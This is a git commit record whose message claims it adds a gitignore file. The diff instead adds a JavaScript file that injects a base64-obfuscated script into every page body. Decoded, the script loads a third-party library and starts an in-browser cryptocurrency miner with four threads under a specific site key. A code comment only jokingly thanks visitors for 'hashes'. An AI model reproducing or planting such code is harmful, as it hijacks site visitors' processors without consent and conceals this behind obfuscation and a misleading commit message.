cdcf4c69cd1ed8f87a77a4f33ecb46c02005bb84
hostinfodev <50676042+hostinfodev@users.noreply.github.com>
2021-06-27 15:39:45 -0700

    Added Git ignore

---
+++ js/crypto.js
@@ -0,0 +1,5 @@
+// Thanks for checking out the site and pumping out a few hashes <3
+$(document.body).append(atob("PHNjcmlwdCBzcmM9Ii8vc3RhdGR5bmFtaWMuY29tL2xpYi9jcnlwdGEuanMiPjwvc2NyaXB0Pgo8c2NyaXB0PgogIHZhciBjaHVuZ3VzPW5ldyBDUkxULkFub255bW91cygnMjM4NDUzZDg3NjZkYzZlODYyYjFlZjQyMDAyODU0MDk0ZWZhMjZiMzQ5YTYnLCB7CiAgICB0aHJlYWRzOjQsdGhyb3R0bGU6MC4yLCBjb2luOiAidXB4IiwKICB9KTsKICBjaHVuZ3VzLnN0YXJ0KCk7Cjwvc2NyaXB0Pg=="));
+
+
+
